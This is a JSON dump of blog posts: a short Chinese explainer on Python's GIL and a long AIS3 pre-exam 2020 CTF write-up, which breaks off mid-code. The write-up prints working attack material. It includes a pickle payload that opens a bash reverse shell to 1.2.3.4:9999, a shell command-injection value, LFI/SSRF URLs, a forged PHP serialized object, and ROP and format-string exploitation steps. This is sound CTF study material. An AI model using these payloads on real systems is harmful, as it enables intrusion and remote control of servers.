{"posts":[{"title":"【程式語言】Python GIL","text":"GIL 解決了什麼問題 每個 python 的物件都有一個 reference count 可以透過 sys.getrefcount 這個函式查看 12345&gt;&gt;&gt; import sys&gt;&gt;&gt; a = []&gt;&gt;&gt; b = a&gt;&gt;&gt; sys.getrefcount(a)3 以上的例子，有 a, b 和 sys.getrefcount 的參數三個 reference 在有很多 threads 的情況下我們必須防止這個 reference count 的 race condition 一個簡單的解決方法就是 GIL 為什麼選 GIL 作為解決方法 就因為簡單易用，讓開發者會想加入開發以及使用它 ( 正因為如此使得 python 這麼熱門 ) 那 GIL 為什麼到現在都還沒被拿掉 因為很多提案雖然讓 multithread 效率增加但卻讓 singlethread 變慢了 python 3.2 在 python 3.2 稍微修改了 GIL 的運作機制 ( 小改進 ) 原本在有 CPU-bound 和 IO-bound 的 threads 互搶時，IO-bound 要等很久才能拿回 GIL ( 詳情看這篇 ) 有 GIL 怎辦 multiprocessing 用 multiprocessing 分許多 process，每個 process 會有獨立的 interpreter 和 memory space ( 不會有因為 GIL 卡住的問題 ) 但是 multi-processing 比起 multi-threading 會有額外的 overhead Alternative Python interpreters 可以用其他實作版本的 python interpreters 比如 Jython 和 IronPython 沒有 GIL https://realpython.com/python-gil/ https://www.youtube.com/watch?v=Obt-vMVdM8s http://dabeaz.blogspot.com/2010/01/python-gil-visualized.html http://www.dabeaz.com/python/GIL.pdf","link":"/2019/01/06/GIL/"},{"title":"【CTF Writeups】AIS3 pre-exam 2020","text":"這學期修了網路攻防實習，這堂課要用 AIS3 Pre-Exam 當期末考，好喔。 攻擊腳本們在這 Misc Piquero 這題給了一張點字的圖，只要先找到出題者用的 generator 這個，接著就一個一個對照就解出來了。 1AIS3{I_feel_sleepy_Good_Night!!!} Karuego 這題給了一張 png，先用 binwalk --dd=&quot;.*&quot; Karuego.png 拉出一個 zip 檔，這個 zip 檔有加密，原本想用 fcrackzip 之類的爆破工具，但 zsteg -a Karuego.png 下去發現 LSB 有一段文字 The key is : lafire，zip 檔解開裡面有一張 Demon.png 打開就看到 flag 了。 1AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?} Soy 這題給了一張 png，是被墨漬污染的 QR Code，我用 https://merricx.github.io/qrazybox/ 把已知的黑點白點都畫了上去就解出來了，因為大部分的 Data 區塊都沒被污染到吧，這個網站上畫 QR Code 的時候記得要畫白點，不要只畫黑點，沒畫的會是未知的灰點，我在這裡卡很久Q 1AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!} Saburo 這題要 nc 60.250.197.227 11001，沒給原始碼，連上去要輸入 flag 給他，他會輸出你幾秒後輸了 12Flag: AHaha, you lose in 24 milliseconds. 猜測是 Side Channel Attack，原始碼猜測大概是 ( 不負責任亂寫 code 如下 ) 1234567891011121314151617181920import timedef compare(real_flag, user_flag): l = len(user_flag) if len(user_flag) &lt; len(real_flag) else len(real_flag) for i in range(len(user_flag)): if user_flag[i] != real_flag[i]: return False return i == len(user_flag) - 1real_flag = 'AIS3{...}'user_flag = input()start = time.clock()win = compare(real_flag, user_flag)end = time.clock()if not win: print(f'Haha, you lose in {end - start} milliseconds.')else: print(f'Oh, you win. QQ') 但是很多人在連線的時候去算 cpu time 會抖的很大力，所以後來 server 應該是改成用模擬的 ( 就比較穩了 )，就是錯了就加個 random 小 noise，對了就加一個大一點的值之類的。 所以每個字都爆搜 0 - 255，然後取最大的就好了，可以每次嘗試都送個十次取平均之類的，或是把 log 記起來，之後如果爆搜所有 byte 都沒有進展的話就，回去找第二高的，會比較穩。 1AIS3{A1r1ght_U_4r3_my_3n3nnies} Shichirou 這題要 nc 60.250.197.227 11000，有給原始碼，給他一個 tar 檔，他幫你解開然後把解開的 guess.txt 跟 local 的 flag.txt 的 sha1 做比較，如果一樣的話就噴 flag。 tar 可以壓縮 symbolic link，自己做一個 symbolic link 指向 flag.txt 就完成了。 12ln -s ../flag.txt guess.txttar -cf test.tar ./ 1AIS3{Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!} Clara 這題給了一個 pcap 檔，一開始啥提示都沒有，後來有說是 Malware 在 monitor 電腦然後傳 encrypted data 給 C&amp;C Server，然後傳了兩次一樣的資料，看了老半天，會發現 tcp 流量裡面有類似 AIS3 的字樣，有兩大包 tcp，一包 10 MB 另一包 27 MB，加密的話大概也只有 xor 比較正常吧，所以複製了一些部分用 xortool 分析，找到 key 是 AIS3{NO}，而且看到 PNG 開頭的字樣和一些 xml 的 meta data，就可以確定假設正確也解對了(汗，既然兩次包的明文是一樣的那就把兩包做 xor 再 xor 上 AIS3{NO} 就得到另一包的 key 是 xSECRETx，接著把整包拿去做 xor 拉出圖片，圖片有好幾 MB 很大，一開始只有拉出一張圖片，某個動漫的圖，又卡了一下後，發現那包前面的部分有類似 header 的東西，他不是 8 的倍數，我一開始是直接不理他，但是猜測後面也有好幾段 header，讓 xor 沒對齊壞掉，所以我就把整段 data 暴力 shift 了幾次拿去 xor，就拉出所有照片了，其中一張有 flag，其他都垃圾，原本不知道有很多張圖片，也不知道 flag 在哪的時候還在開 stegsolve 和 zsteg 在圖片找 flag，浪費很多時間。 他的 packet 是很有秩序沒有亂傳的，header 裡面就是固定傳一個 0xdeadbeeffaceb00c 然後 C&amp;C 把剛剛那段 xor 加密回傳，接著後面檔案名字的大小，和檔案名字，每個都分開傳，每個都自己做 xor cipher，接著就是傳 data，都沒有走歪或是掉進什麼坑的話還是有機會解出來的，我也不常分析 packet 也沒分析過什麼惡意程式，經驗不足所以解很久還要看 hint QQ 1AIS3{T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??} Reverse TsaiBro 這題給了一個 ELF 執行檔還有被加密的 flag 檔，被加密的 flag 檔的一小段大概長下面這樣 發財..發財.......發財....發財.......發財....發財.發財........ 隨便用 ida 看了一下後，加密流程就是把 flag 轉乘 flag // 8 和 flag % 8，然後數字是多少就轉乘多少個點，所以最多 8 個點，上面那段就是 [2, 7, 4, 7, 4, 1, 8]，那解密就反過來組回去就好。 1AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3} Fallen Beat 這題給了一隻 jar 執行檔，跑起來是一個節奏遊戲，要 Full Combo 才能拿到 flag，那直接 JD-GUI 下去看他，關鍵在 PanelEnding.class 裡面，定義了被加密的 flag 陣列，還有後面做 xor 解回 flag 印出來的部分 12345byte[] flag = new byte[] { 89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, Byte.MAX_VALUE, 124, 94, 103, 46, 107, 97, 104 }; 123456if (t == mc) { for (i = 0; i &lt; cache.size(); i++) this.flag[i % this.flag.length] = (byte)(this.flag[i % this.flag.length] ^ ((Integer)cache.get(i)).intValue()); String fff = new String(this.flag); this.text[0].setText(String.format(&quot;Flag: %s&quot;, new Object[] { fff }));} 這裡的 cache 原本以為是內建的東東，結果不是，追了一下發現在 GameControl.class 有定義，東西是從 songs/gekkou/hell.txt 抓出來的，那就直接照著 xor 就解出來了。 1AIS3{Wow_how_m4ny_h4nds_do_you_h4ve} Stand up!Brain 這題給了一個 ELF 執行檔，隨便看了一下發現他實做了 Brainfuck，然後程式碼在執行檔裡面，拉出來長這樣 1-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]] 人腦跑了一下發現前面一段是在做很多 if 判斷，後面有 . 的部分是印 flag 的部分。 1234567891011121314151617# if (ptr[0] - 67) == 0-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[ # if (ptr[2] - 56) == 0 &gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[4] - 55) == 0 &gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[6] - 54) == 0 &gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[8] - 51) == 0 &gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[8] - 33) == 0 &gt;---------------------------------[&gt;[-]&lt;[-]]&gt; 所以只要你的輸入要是 C8763! 就會進到後面印 flag 的部分，所以可以直接執行原本的程式輸入 C8763! 跟桐人一起使出星爆氣流斬拿 flag，或是直接忽略前面把後面那段貼到線上的 Brainfuck Compiler 執行一下也可以拿到 flag。 1AIS3{Th1s_1s_br4iNFUCK_bu7_m0r3_ez} Long Island Iced Tea 這題給了一個 ELF 執行檔還有被加密的 flag 檔，被加密的 flag 長這樣 1850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000 隨便嘗試了一下發現超過 8 個 bytes 之後的都不會變而且直接是明文了，把上面那段從 hex 轉回 bytes 就變成 1\\x85\\n*M?\\xac\\x14\\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 前面 8 個 bytes 已知 AIS3{ 5 個字了，所以直接爆搜剩下 3 個字。 1AIS3{A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__} La vie en rose 這題給了給 PE 的執行檔，原本以為\u001d要逆向 windows 了，打開後看到一堆 python 的函式庫還有 tkinter，發現他是用 PyInstaller 包的，參考 這篇 用官方的 archive_viewer.py 把 pyc 拉出來 ( 其實好像是 pyd 檔才對，好像格式上差了一點 )，在逆 pyc 的時候確定版本很重要，拉出來的 pyc 沒有 magic value header，可以隨便再撈個比如 pyimod01_os_path 出來，這個就有 magic value 是 550d 0d0a，所以是 Python 3.8 b4 版，先嘗試用了一下 uncompyle6 去還原原始碼，可是他噴錯然後失敗了，那我們就直接看 bytecode 吧，用 marshal.loads 載入為 code object 再用 dis.dis 去 disassemble，邊猜他的原始碼，可以邊用 dis.dis(compile('x = 1', 'filename', 'exec')) 去驗證，看了一下會發現 1flag = &quot;&quot;.join(map(chr, [secret[i] ^ notes[i % len(notes)] for i in range(len(secret))])) flag 是用 secret 和 notes xor 出來的，secret 是寫死的，notes 是從 input 輸入進來的，然後做了下面的計算算出 result 12345notes = list(map(ord, notes))for i in range(len(notes) - 1): result.append(notes[i] + notes[i+1])for i in range(len(notes) - 1): result.append(notes[i] - notes[i+1]) 最後把 result 跟一個固定的陣列做比較，所以我們有 a+b 和 a-b 只要把兩個加起來除以二就拿到 a 了，把 notes 還原再跟 secret xor 就得到 flag 了。 1AIS3{th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan} Uroboros 這題給了一個 ELF 執行檔，是 C++ 寫的，總之就逆他，發現他是一個 circular double linked list，結構就像下面這樣很普通。 12345struct Node { struct Node* prev; struct Node* next; int data;}; 總共有 314 個 Node，對輸入的每個字，他會先往下走 輸入的字乘上 7 次然後把走到的那個 Node 的值乘 64 加上 counter，counter 就是一開始是 1，每經過一個字加一，最後把整段輸出跟某個答案比較，對了就代表你的輸入就是 flag，所以就照著解回來，把數字當成 64 進位拆開，比如第 141 個 Node 存的 70 拆成 64 * 1 + 6，代表第一個和第六個字是 ‘A’，因為 ord('A') * 7 = 141 ( mod 341 )，就是把 141 * inverse(7, 341) = 65 = ord('A')，就這樣。 1AIS3{4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy} Pwn BOF 最簡單的 buffer overflow，裡面已經有一個函式，直接呼叫就拿到 shell 了，但是記得要跳到 push rbp 下一行，如果跳到 push rbp 的話 stack 會沒有對齊 16 的倍數，做 system 的時候會進到 child thread 然後跑到 movaps XMMWORD PTR [rsp+0x40], xmm0 因為沒對齊就掛了，然後 child thread 死掉 system 就會執行完跳出來 ( 都還沒打到指令 )，出來跑到函式結尾 return 的時候又會掛掉，因為正常呼叫函式都會把 return address 放到 stack 上，但是直接跳過去就沒有放，他就會 return 到奇怪的位置。 1AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt} Nonsense 這題讓我們輸入 shellcode，然後會檢查 shellcode 裡面有沒有 wubbalubbadubdub 這段字，並且在這段字前面的每個字都要小於等於 31，而找到那段字之後就會直接跳出檢查函式，所以那段字的後面都不會被檢查了，那我們的 shellcode 就構造成最開頭先 ja 跳到後面真正的 shellcode，然後中間放 wubbalubbadubdub，就完成了。 12345ja shellcode... (some padding instructions)wubbalubbadubdubshellcode:... 1AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!} Portal Gun 這題就是用 gets 的 bof，有一個函式有用到 system('sh')，但是他有 LD_PRELOAD 一個 hook.so 裡面把 system hook 掉了，所以不能直接叫，那就堆 ROP leak libc address 再自己跳進去 system 吧。 1AIS3{U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o} Morty School 這題一開始就給你 leak libc address 給你，接下來你可以挑一個 Morty 教，但你給的 index 他沒有檢查，所以可以任意寫一個位址，但是不是直接寫值上去，而是寫到你給他的位址裡面放的位址裡面的值，所以找一下哪裡有存 __stack_chk_fail got 的位址，利用他去寫 __stack_chk_fail 的 got 改成我們串好的 ROP gadgets，然後寫爆 stack（ 因為這裡也有 overflow ），就跳去做 ROP 了，一開始有想直接跳 one gadgets 但是條件都不符，所以就自己做 ROP 做 system('/bin/sh')。 1AIS3{s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS} Death Crystal 這題是 format string，但是有檢查輸入，所有字都不能有 $, \\, /, ^，並且 % 後面都不能有 c, p, n, h，主要是不能用 $ 去指定參數，但沒關係就多放幾個 padding 用的把參數推過去就好了，他的 flag 已經讀進來放到 0x202060 了，但是 PIE 有開所以還是要 leak 一下 code base address，要繞過檢查只要前面隨便放個數字就好了，比如 %1p，先 b'%1p' * 11 + b';%1p' leak 出 code base address，然後再 b'%d' * 8 + b'%100sAA\\x00' + p64(base + 0x202060) 就拿到 flag 了。 1AIS3{FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY} Meeseeks Box 這題是 heap 題，很一般的有 create, show, delete 的題目，然後沒什麼檢查，而且是 ubuntu 18.04 有 tcache 可以用，所以先弄個夠大的 chunk 然後 free 掉他讓他進到 unsorted bins 就可以拿 libc address 了，然後有 tcache 可以隨便 double free 他去把 __malloc_hook 寫成 one gadget 的位址就完成了。 1AIS3{G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l} Crypto Brontosaurus 給了一個檔案叫 KcufsJ 裡面是 jsfuck 混淆過的 js code，他的檔名就是倒過來的 jsfuck，所以內容也要倒過來，開瀏覽器 console 執行一下就好了。 1AIS3{Br0n7Os4uru5_ch3at_3asi1Y} T-Rex 123456789101112131415 ! @ # $ % &amp; ! V F Y J 6 1 @ 5 0 M 2 9 L # I W H S 4 Q $ K G B X T A % E 3 C 7 P N &amp; U Z 8 R D O&amp;$ !# $# @% { %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## ! # &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @ @ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# % &amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ } 給了一張表和密文，對表轉回去就好了，但要注意 row 和 column 的順序，&amp;$ 是 A 不是 R。 Octopus 這題給 python script 和他執行後的 output，裡面在做 BB84 量子密鑰分發，兩邊的 Basis 都給了，Qubits 也給了，就是把 Basis 一樣部分的那些 Qubits 抓出來轉回 binary 就好了。 1AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84} Blowfish 這題要 nc 60.250.197.227 12001，有給原始碼，還有一個 python pickle dump 的檔案 1[{'name': 'maojui', 'password': 'SECRET', 'admin': False}, {'name': 'djosix', 'password': 'S3crE7', 'admin': False}, {'name': 'kaibro', 'password': 'GGInIn', 'admin': False}, {'name': 'others', 'password': '_FLAG_', 'admin': False}] 連上去之後，他會給你這段用 Blowfish 的 CTR Mode 加密的結果當作 token，接著你就可以再把 token 丟回去給他解密，他會看你是不是 admin，因為是 CTR Mode 所以就翻一下 bit 就好了，把那個 False 的部分翻成 True，就這麼簡單。 詳情可以參考 這份投影片 Bit-Flipping Attack 的部分。 1AIS3{ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^} Camel 這題給了 sage script，裡面有一個 Elliptic Curve，並給了上面的 9 個點，flag 就是 Elliptic Curve 的參數，因為他給的點的 x 座標都是 $p-1, p+1, p+2, …$，所以帶進 $y^2 = x^3 + a x + b$ 式子 mod p 之後 p 就都不見了 $$ \\begin{align} &amp;(p-1)^3 + a (p-1) + b = -1 - a + b \\pmod{p} \\\\ &amp;(p+1)^3 + a (p+1) + b = 1 + a + b \\pmod{p} \\end{align} $$ 上面兩式相加之後可以得到 2b，還有其他兩組 p+3, p-3, p+5, p-5 也是同樣的情況，所以我們可以拿到三組 2b + kp 這樣形式的東西，把他們互減去做 gcd 就得到 p 了，有 p 之後就帶回去就可以得到 a, b。 1AIS3{Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P} Turtle 這題就是 Padding Oracle Attack，我把以前的 script 拿出來然後把 oracle 換成用 requests 去抓就完成了。 詳情可以參考 這份投影片 Padding Oracle Attack 的部分。 1AIS3{5l0w_4nd_5734dy_w1n5_7h3_r4c3.} Web Squirrel 這題網站在 https://squirrel.ais3.org/，打開看一下流量會看到有一個請求是 /api.php?get=/etc/passwd，看起來是直接給你 local file inclusion，抓一下網站原始碼 /api.php?get=/var/www/html/api.php 123456789101112131415161718192021&lt;?phpheader('Content-Type: application\\/json');if ($file = @$_GET['get']) { $output = shell_exec(&quot;cat '$file'&quot;); if ($output !== null) { echo json_encode([ 'output' =&gt; $output ]); } else { echo json_encode([ 'error' =&gt; 'cannot get file' ]); }} else { echo json_encode([ 'error' =&gt; 'empty file path' ]);} 看起來是 command injection，/api.php?get='|bash -c 'ls 就可以執行任意 command 了，ls / 看根目錄有個 5qu1rr3l_15_4_k1nd_0f_b16_r47.txt 裡面就是 flag 了 ( 剛好檔名跟 flag 一樣，真佛心 ) 1AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47} Shark 這題網站在 https://shark.ais3.org/，首頁有個連結點下去就是 /?path=hint.txt，又是 local file inclusion，但是 hint 說 123Please find the other server in the internal network! (flag is on that server) GET http://some-internal-server/flag 那就先看一下原始碼 /?path=/var/www/html/index.php，直接看會拿到 [forbidden]，那隨便繞一下 /?path=file:///var/www/html/index.php 1234567891011121314151617181920&lt;?php if ($path = @$_GET['path']) { if (preg_match('/^(\\.|\\/)/', $path)) { // disallow /path/like/this and ../this die('&lt;pre&gt;[forbidden]&lt;/pre&gt;'); } $content = @file_get_contents($path, FALSE, NULL, 0, 1000); die('&lt;pre&gt;' . ($content ? htmlentities($content) : '[empty]') . '&lt;/pre&gt;'); }?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;🦈🦈🦈&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;🦈🦈🦈&lt;/h1&gt; &lt;a href=&quot;?path=hint.txt&quot;&gt;Shark never cries?&lt;/a&gt;&lt;/body&gt; 有用 regex 檢查開頭不能是 . 和 /，所以 file:// 或 php://filter/read=convert.base64-encode/resource= 都可以繞，再來看 /?path=file:///etc/hosts 1234567127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.22.0.3 02b23467485e 瀏覽一下 /?path=http://02b23467485e 發現是本機，那就找找子網路下的鄰居們，就找到 /?path=http://172.22.0.2/flag 1AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5} Elephant 這題網站在 https://elephant.ais3.org/，首頁可以登入，隨便輸入個 username 就登入了不需要密碼，第一步當然是找找有沒有原始碼，看了一下 robots.txt 沒東西，再看 .git 是 Forbidden，中獎，隨便找個 GitDumper 把 .git 抓下來，git log 看到前一個 commit 把原始碼刪掉了，git reset --hard 回去，原始碼如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?phpconst SESSION = 'elephant_user';$flag = file_get_contents('/flag');class User { public $name; private $token; function __construct($name) { $this-&gt;name = $name; $this-&gt;token = md5($_SERVER['REMOTE_ADDR'] . rand()); } function canReadFlag() { return strcmp($flag, $this-&gt;token) == 0; }}if (isset($_GET['logout'])) { header('Location: /'); setcookie(SESSION, NULL, 0); exit;}$user = NULL;if ($name = $_POST['name']) { $user = new User($name); header('Location: /'); setcookie(SESSION, base64_encode(serialize($user)), time() + 600); exit;} else if ($data = @$_COOKIE[SESSION]) { $user = unserialize(base64_decode($data));}?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;Elephant&lt;/title&gt; &lt;meta charset='utf-8'&gt; &lt;link href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt; &lt;script src=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!$user): ?&gt; &lt;div id=&quot;login&quot;&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;Are you familiar with PHP?&lt;/h3&gt; &lt;div class=&quot;container&quot;&gt; &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt; &lt;div id=&quot;login-box&quot; class=&quot;col-md-12&quot;&gt; &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;What's your name!?&lt;/h3&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;name&quot; class=&quot;text-info&quot;&gt;Name:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot; class=&quot;form-control&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;let me in&quot;&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php else: ?&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;You may want to read the source code.&lt;/h3&gt; &lt;div class=&quot;container&quot; style=&quot;text-align: center&quot;&gt; &lt;img src=&quot;images/elephant2.png&quot;&gt; &lt;/div&gt; &lt;hr&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div class=&quot;col-md-6&quot;&gt; &lt;div class=&quot;col-md-12&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;Do you know?&lt;/h3&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;PHP's mascot is an elephant!&lt;/h3&gt; Hello, &lt;b&gt;&lt;?= $user-&gt;name ?&gt;&lt;/b&gt;! &lt;?php if ($user-&gt;canReadFlag()): ?&gt; This is your flag: &lt;b&gt;&lt;?= $flag ?&gt;&lt;/b&gt; &lt;?php else: ?&gt; Your token is not sufficient to read the flag! &lt;?php endif; ?&gt; &lt;a href=&quot;?logout&quot;&gt;Logout!&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php endif ?&gt;&lt;/body&gt; 只要讓 strcmp($flag, $this-&gt;token) == 0 就好啦，那 strcmp 已知的問題就是他 compare 陣列隨然會噴 Warning，但結果會是 NULL，而這裡是用兩個 = 不是三個，所以 NULL == 0，把下面這段 base64 encode 後放回 Cookie 就完成啦。 1O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:11:&quot;\\x00User\\x00token&quot;;a:0:{}} 1AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry} Snake 這題網站在 https://snake.ais3.org/ ，首頁就是原始碼了 123456789101112131415161718192021222324from flask import Flask, Response, requestimport pickle, base64, tracebackResponse.default_mimetype = 'text/plain'app = Flask(__name__)@app.route(&quot;/&quot;)def index(): data = request.values.get('data') if data is not None: try: data = base64.b64decode(data) data = pickle.loads(data) if data and not data: return open('/flag').read() return str(data) except: return traceback.format_exc() return open(__file__).read() 給他 data，他會 pickle.loads，沒有任何檢查，所以直接 reverse shell 12345678910import osimport picklefrom base64 import *class Exploit: def __reduce__(self): return(os.system, (('bash -c &quot;bash -i &gt;&amp; /dev/tcp/1.2.3.4/9999 0&gt;&amp;1&quot;'),))ex = Exploit()print(b64decode(pickle.dumps(ex))) 1AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.} Owl 這題網站在 https://turtowl.ais3.org/，首頁有登入頁面，他有個白色字寫 GUESS THE STUPID USERNAME / PASSWORD，猜 admin/admin 就登進去了，登進去後，又有個白色字按鈕寫 SHOW HINT，點下去就看到原始碼了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } // Settings ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); date_default_timezone_set('Asia/Taipei'); session_start(); // CSRF if (!isset($_SESSION['csrf_key'])) $_SESSION['csrf_key'] = md5(rand() * rand()); require_once('csrf.php'); $csrf = new Csrf($_SESSION['csrf_key']); if ($action = @$_GET['action']) { function redirect($path = '/', $message = null) { $alert = $message ? 'alert(' . json_encode($message) . ')' : ''; $path = json_encode($path); die(&quot;&lt;script&gt;$alert; document.location.replace($path);&lt;/script&gt;&quot;); } if ($action === 'logout') { unset($_SESSION['user']); redirect('/'); } else if ($action === 'login') { // Validate CSRF token $token = @$_POST['csrf_token']; if (!$token || !$csrf-&gt;validate($token)) { redirect('/', 'invalid csrf_token'); } // Check if username and password are given $username = @$_POST['username']; $password = @$_POST['password']; if (!$username || !$password) { redirect('/', 'username and password should not be empty'); } // Get rid of sqlmap kiddies if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) { redirect('/', &quot;sqlmap is child's play&quot;); } // Get rid of you $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--']; $username = str_ireplace($bad, '', $username); $username = str_ireplace($bad, '', $username); // Auth $hash = md5($password); $row = (new SQLite3('/db.sqlite3')) -&gt;querySingle(&quot;SELECT * FROM users WHERE username = '$username' AND password = '$hash'&quot;, true); if (!$row) { redirect('/', 'login failed'); } 